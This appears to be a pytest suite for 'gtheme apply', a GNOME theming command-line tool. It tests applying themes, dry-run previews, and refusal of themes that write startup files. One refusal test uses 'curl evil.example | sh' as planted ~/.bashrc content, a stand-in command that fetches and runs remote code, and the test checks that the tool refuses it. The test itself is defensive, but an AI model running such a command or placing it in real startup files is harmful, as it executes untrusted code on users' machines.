"""``gtheme apply`` — using a Look from a terminal, with no window.

Everything here runs against an in-memory settings backend, a throwaway
destination root and a throwaway state directory. Nothing in this file can
reach the desktop the tests are running on, which matters more than usual: the
command under test is the one that changes a desktop on purpose.

What is pinned:

* a Look given as a *folder* applies, and lands its file and its setting;
* ``--dry-run`` prints the same lines the app's preview shows and changes
  nothing — including naming, one by one, any file that can start a program;
* a Look that asks for something no Look may have is refused with exit code 1
  and an untouched desktop;
* a name nobody has says so, and says which names there are;
* ``min_shell`` warns and does not block, which is what the format has always
  promised.
"""

from __future__ import annotations

import io
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path

import pytest

from gtheme.core import backends
from gtheme.core.settings_backend import MemoryBackend

SCHEMA_XML = """<?xml version="1.0" encoding="UTF-8"?>
<schemalist>
  <schema id="org.gnome.desktop.interface" path="/org/gnome/desktop/interface/">
    <key name="color-scheme" type="s">
      <default>'default'</default>
    </key>
    <key name="icon-theme" type="s">
      <default>'Adwaita'</default>
    </key>
  </schema>
</schemalist>
"""

SCHEME = "gsettings:org.gnome.desktop.interface color-scheme"

#: Enough of a Look to be valid. The pieces each test needs are appended.
HEADER = """
format = 2

[meta]
name = "demo"
title = "DEMO"
description = "A Look for the tests."
author = "the suite"
version = "1.0.0"
screenshots = ["shot.png"]
"""


@dataclass
class Desk:
    """An isolated stand-in desktop, plus a place to build Looks."""

    backend: MemoryBackend
    dest_root: Path
    looks: Path

    def make_look(self, name: str, body: str, files: dict[str, str] | None = None) -> Path:
        directory = self.looks / name
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "theme.toml").write_text(HEADER + body, encoding="utf-8")
        (directory / "shot.png").write_bytes(b"not really a picture")
        for relative, text in (files or {}).items():
            target = directory / relative
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text, encoding="utf-8")
        return directory


@pytest.fixture
def desk(
    memory_settings: MemoryBackend,
    tmp_dest_root: Path,
    state_dir: Path,
    schema_source_factory,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> Iterator[Desk]:
    """The seam. Settings, files and saved moments all go nowhere real.

    Requesting ``memory_settings``, ``tmp_dest_root`` and ``state_dir`` is what
    satisfies the ``mutating`` guard in ``tests/conftest.py``; the guard reads
    fixture names, so a test that asks for ``desk`` is properly seamed.
    """
    backend = MemoryBackend(schema_source=schema_source_factory(SCHEMA_XML))
    del memory_settings  # requested for the seam; this one carries the schemas

    data_home = tmp_path / "data"
    (data_home / "gnome-shell" / "extensions").mkdir(parents=True)
    monkeypatch.setenv("XDG_DATA_HOME", str(data_home))
    # No Look is installed unless a test installs one, so name lookup is
    # answered by this directory and never by the machine's own.
    monkeypatch.setenv("GTHEME_THEMES_DIR", str(tmp_path / "installed"))
    monkeypatch.setenv("GTHEME_BUNDLED_THEMES_DIR", str(tmp_path / "bundled"))

    from gtheme.core import placeholders

    placeholders.clear_cache()
    with backends.use_backend(backend):
        yield Desk(backend=backend, dest_root=tmp_dest_root, looks=tmp_path / "looks")
    placeholders.clear_cache()


def run(target: str, *, dry_run: bool = False, shell_version: str | None = "50.0"):
    """Call the command and hand back ``(code, out, err)``.

    ``shell_version`` is always passed, so nothing here ever asks the live
    desktop what version it is.
    """
    from gtheme.headless_apply import run_apply

    out, err = io.StringIO(), io.StringIO()
    code = run_apply(target, dry_run=dry_run, out=out, err=err, shell_version=shell_version)
    return code, out.getvalue(), err.getvalue()


# -- applying a Look given as a folder --------------------------------------


@pytest.mark.mutating
def test_a_look_given_as_a_folder_is_applied(desk):
    """The whole point: a path, no window, and a changed desktop."""
    directory = desk.make_look(
        "demo",
        """
[[files]]
src = "files/note.txt"
dest = "~/.config/demo/note.txt"

[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
        files={"files/note.txt": "hello\n"},
    )

    code, out, err = run(str(directory))

    assert code == 0, err
    assert (desk.dest_root / ".config" / "demo" / "note.txt").read_text() == "hello\n"
    assert desk.backend.get(SCHEME) == "'prefer-dark'"
    assert "DEMO" in out


@pytest.mark.mutating
def test_an_installed_look_can_be_applied_by_its_name(desk, tmp_path):
    """A name, not a path — the form a person actually types."""
    installed = tmp_path / "installed" / "demo"
    installed.mkdir(parents=True)
    (installed / "theme.toml").write_text(
        HEADER
        + """
[[settings]]
key = "gsettings:org.gnome.desktop.interface icon-theme"
value = "'Papirus-Dark'"
component = "icons"
""",
        encoding="utf-8",
    )
    (installed / "shot.png").write_bytes(b"not really a picture")

    code, _out, err = run("demo")

    assert code == 0, err
    assert desk.backend.get("gsettings:org.gnome.desktop.interface icon-theme") == "'Papirus-Dark'"


# -- --dry-run ---------------------------------------------------------------


@pytest.mark.mutating
def test_dry_run_names_a_file_that_can_start_programs_and_changes_nothing(desk):
    """The C1 rule, in the terminal.

    A count ("2 files") over a Look that writes the command prompt's own
    settings file is exactly the collapse the app is not allowed to make. The
    dry run has to name it, and has to leave the desktop alone.
    """
    directory = desk.make_look(
        "demo",
        """
[[files]]
src = "files/wall.png"
dest = "~/.local/share/backgrounds/demo/wall.png"

[[files]]
src = "files/starship.toml"
dest = "~/.config/starship.toml"

[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
        files={"files/wall.png": "picture", "files/starship.toml": "prompt\n"},
    )

    code, out, err = run(str(directory), dry_run=True)

    assert code == 0, err
    assert "starship.toml" in out
    assert "can be told to run programs" in out
    # And nothing happened.
    assert not (desk.dest_root / ".config" / "starship.toml").exists()
    assert not (desk.dest_root / ".local").exists()
    assert desk.backend.get(SCHEME) == "'default'"
    assert "--dry-run" in out


@pytest.mark.mutating
def test_dry_run_says_what_the_look_asks_for_that_will_not_happen(desk):
    """A named file the Look does not ship is a note, not a failure."""
    directory = desk.make_look(
        "demo",
        """
[[files]]
src = "files/absent.png"
dest = "~/.config/demo/absent.png"

[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
    )

    code, out, _err = run(str(directory), dry_run=True)

    assert code == 0
    assert "absent.png" in out
    assert "Worth knowing" in out


# -- refusal -----------------------------------------------------------------


@pytest.mark.mutating
def test_a_look_that_asks_to_write_a_startup_file_is_refused(desk):
    """Exit 1, the reason on standard error, and an untouched desktop."""
    directory = desk.make_look(
        "demo",
        """
[[files]]
src = "files/rc"
dest = "~/.bashrc"

[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
        files={"files/rc": "curl evil.example | sh\n"},
    )

    code, _out, err = run(str(directory))

    assert code == 1
    assert ".bashrc" in err
    assert "run every time a command window opens" in err
    # The compiler's own sentence, not the engine preflight's — a refused Look
    # cannot even be previewed, and "it could not be worked out" would be a
    # worse thing to print at somebody than the file it asked for.
    assert "so gtheme will not apply it" in err
    assert not (desk.dest_root / ".bashrc").exists()
    assert desk.backend.get(SCHEME) == "'default'"


@pytest.mark.mutating
def test_a_dry_run_of_a_refused_look_also_exits_one(desk):
    """A preview that ends in a refusal must not look like a green light."""
    directory = desk.make_look(
        "demo",
        """
[[files]]
src = "files/entry"
dest = "~/.config/autostart/demo.desktop"
""",
        files={"files/entry": "[Desktop Entry]\n"},
    )

    code, out, err = run(str(directory), dry_run=True)

    assert code == 1
    assert "will not use this Look" in out
    assert "demo.desktop" in out
    assert "program entry" in out
    assert "Nothing was changed" in err


# -- a name nobody has -------------------------------------------------------


@pytest.mark.mutating
def test_an_unknown_name_says_so_and_lists_the_looks_that_are_here(desk, tmp_path):
    installed = tmp_path / "installed" / "demo"
    installed.mkdir(parents=True)
    (installed / "theme.toml").write_text(HEADER, encoding="utf-8")

    code, out, err = run("nightbloom")

    assert code == 1
    assert out == ""
    assert "no Look called 'nightbloom'" in err
    assert "demo" in err


@pytest.mark.mutating
def test_a_folder_with_no_look_in_it_says_what_is_missing(desk, tmp_path):
    empty = tmp_path / "not-a-look"
    empty.mkdir()

    code, _out, err = run(str(empty))

    assert code == 1
    assert "theme.toml" in err


# -- min_shell warns, and never blocks ---------------------------------------


@pytest.mark.mutating
def test_a_look_made_for_a_newer_desktop_warns_and_still_applies(desk):
    """``docs/preset-format.md`` has always said this warns rather than blocks."""
    directory = desk.make_look(
        "demo",
        """
[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
    )
    text = (directory / "theme.toml").read_text(encoding="utf-8")
    (directory / "theme.toml").write_text(
        text.replace('version = "1.0.0"', 'version = "1.0.0"\nmin_shell = "99"'),
        encoding="utf-8",
    )

    code, out, err = run(str(directory), shell_version="50.0")

    assert code == 0, err
    assert "newer version of GNOME" in out
    assert desk.backend.get(SCHEME) == "'prefer-dark'"


# -- the wiring --------------------------------------------------------------


def test_apply_is_a_real_subcommand():
    from gtheme.cli import _COMMANDS

    assert "apply" in _COMMANDS


@pytest.mark.mutating
def test_main_routes_apply_through_to_the_headless_path(desk, monkeypatch, capsys):
    """``gtheme apply --dry-run <folder>`` end to end, through argparse."""
    from gtheme import headless_apply
    from gtheme.cli import main

    monkeypatch.setattr(headless_apply, "detect_shell_version", lambda: "50.0")
    directory = desk.make_look(
        "demo",
        """
[[settings]]
key = "gsettings:org.gnome.desktop.interface color-scheme"
value = "'prefer-dark'"
component = "colors"
""",
    )

    assert main(["apply", "--dry-run", str(directory)]) == 0
    captured = capsys.readouterr()
    assert "Colours" in captured.out
    assert desk.backend.get(SCHEME) == "'default'"
